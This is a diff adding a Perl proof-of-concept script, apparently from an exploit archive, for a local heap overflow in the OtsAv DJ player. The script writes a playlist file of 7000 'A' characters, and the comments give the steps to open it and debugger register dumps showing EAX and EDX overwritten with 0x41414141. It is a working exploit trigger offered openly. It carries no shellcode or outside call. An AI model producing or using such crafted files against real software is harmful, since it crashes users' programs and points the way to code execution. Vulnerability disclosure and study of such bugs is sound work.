@@ -1,0 +1,36 @@
+#!/usr/bin/perl
+# OtsAv DJ [.olf] Local Heap Overflow Poc
+# Down : http://serv-08.download.otszone.com/download.cgi/otsavdjtrialsetup.exe?A=13JTHRVWJLLLZ5JG2AYRNSMN%2DWJMQXDJKA%2DRFQ&otsavdjtrialsetup.exe
+# Desc : 7000 A' Heap overflow
+# By Mountassif Moad a.k.a Stack
+# v4 Team & evil finger
+# Open Stack.ofl >> File >>  Import List   >> As playlist  >>
+# BOOOOOOOOOOOOOOOOOOOM
+# register of 7000 A'
+# EAX 41414141
+# ECX 00E5448C OtsAVDJt.00E5448C
+# EDX 41414141
+# EBX 00E54488 OtsAVDJt.00E54488
+# ESP 02C6FE1C
+# EBP 00E0D328 OtsAVDJt.00E0D328
+# ESI 00000000
+# EDI 0174C070 ASCII "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+# EIP 0046266C OtsAVDJt.0046266C
+# register of 2000 A'
+# EAX 41414141
+# ECX 00001B05
+# EDX 02FAF730
+# EBX 0000042A
+# ESP 02FAF9C8
+# EBP 00000000
+# ESI 020FAFEA
+# EDI 02FAFEAA
+# EIP 0043C8D7 OtsAVDJt.0043C8D7
+use strict;
+use warnings;
+my $A= "\x41" x 7000;
+open(my $ofl_playlist, "> stack.ofl");
+print $ofl_playlist
+                    $A.
+                    "\r\n";
+close $ofl_playlist;
